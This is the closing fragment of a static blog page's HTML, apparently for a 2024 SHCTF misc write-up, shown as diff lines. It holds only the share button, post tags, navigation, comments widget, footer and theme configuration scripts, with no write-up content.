+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;2024SHCTF_misc&#34;, &#34;http://scofield1920.github.io/2024shctf_misc/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/wp/">Wp</a>,&nbsp;<a href="/tags/misc/">Misc</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2024meiyacup_individual/" class="prev" rel="prev" title="2024第十届美亚杯资格赛内存取证和 U 盘取证"><i class="fas fa-angle-left fa-fw"></i>2024第十届美亚杯资格赛内存取证和 U 盘取证</a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
